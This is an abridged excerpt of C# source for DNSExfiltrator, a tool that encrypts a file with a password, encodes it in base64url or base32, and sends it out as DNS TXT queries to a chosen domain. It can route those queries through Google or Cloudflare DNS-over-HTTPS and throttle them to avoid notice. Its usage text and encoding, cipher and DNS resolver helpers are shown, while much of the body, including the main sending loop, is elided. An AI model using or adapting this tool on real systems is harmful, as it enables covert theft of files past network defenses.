...
namespace DNSExfiltrator
{
    ...
    public class DNSExfiltrator
    {
        ...
        private static void PrintUsage()
        {
            ...
            Console.WriteLine("{0} <file> <domainName> <password> [-b32] [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]", AppDomain.CurrentDomain.FriendlyName);
            ...
            Console.WriteLine("\t-b32:\t\t[OPTIONAL] Use base32 encoding of data. Might be required by some DNS resolver which break case.");
            Console.WriteLine("\th:\t\t[OPTIONAL] Use Google or CloudFlare DoH (DNS over HTTP) servers.");
            Console.WriteLine("\tDNS_Server:\t[OPTIONAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.");
            Console.WriteLine("\tthrottleTime:\t[OPTIONAL] The time in milliseconds to wait between each DNS request.");
            Console.WriteLine("\trequestMaxSize:\t[OPTIONAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes.");
            Console.WriteLine("\tlabelMaxSize:\t[OPTIONAL] The maximum size in chars for each DNS request label (subdomain). Defaults to 63 chars.");
        }
        ...
        private static string ToBase64Url(byte[] data)
        {
            ...
            // '/' and '+' characters are substituted
        ...
        private static string ToBase32(byte[] data)
        {
            ...
            // '/' and '+' characters are substituted
            // '=' padding character are removed and will need to be recomputed at the remote end
            string result = Base32.ToBase32String(data).Replace("=", "");
            return result;
        }
    ...
    {
        public static byte[] Encrypt(byte[] key, IEnumerable<byte> data)
        {
            return EncryptOutput(key, data).ToArray();
        }

        private static byte[] EncryptInitialize(IList<byte> key)
        {
        ...
        private static IEnumerable<byte> EncryptOutput(IList<byte> key, IEnumerable<byte> data)
        {
        ...
        private static void Swap(IList<byte> s, int i, int j)
        {
            byte c = s[i];
            s[i] = s[j];
            s[j] = c;
    ...
    {
        private const string GoogleDohUri = " https://dns.google.com/resolve?name="; // https://developers.google.com/speed/public-dns/docs/dns-over-https
        private const string CloudflareDohUri = "https://cloudflare-dns.com/dns-query?ct=application/dns-json&name="; // https://developers.cloudflare.com/1.1.1.1/dns-over-https/wireformat/
        ...
        public static string GetTxtRecord(string dohProvider, string domain)
        {
            ...
            string responsePacket = webClient.DownloadString(dohQuery);
            responsePacket = responsePacket.Replace("\\\"", ""); // Replies with "data": "\"OK\"" causes JSON parsing to fail because of the un-needed escaped double-quote
    ...
    public static class DnsResolver
    {
        ...
        public static string GetTxtRecord(string domain, string serverIp = null)
        {
            ...
            try
            {
                ...
                for (dnsRecord = recordsArray; !dnsRecord.Equals(IntPtr.Zero); dnsRecord = txtRecord.pNext)
                {
                    ...
                    if (txtRecord.wType != (int)DnsRecordTypes.DNS_TYPE_TXT) continue;
        ...
        private struct IP4_ARRAY
        {
            ...
            /// IP4_ADDRESS[1]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.U4)] public uint[] AddressArray;
        }
        ...
        private struct TxtRecord
        {
            ...
            // TXT record specific
            private readonly int dwStringCount;
    ...
    internal static class Base32
    {
        ...
        internal static string ToBase32String(byte[] bytes)
        {
            ...
            while (bytesPosition < bytes.Length)
            {
                ...
                if (outputBase32BytePosition < OutByteSize) continue;
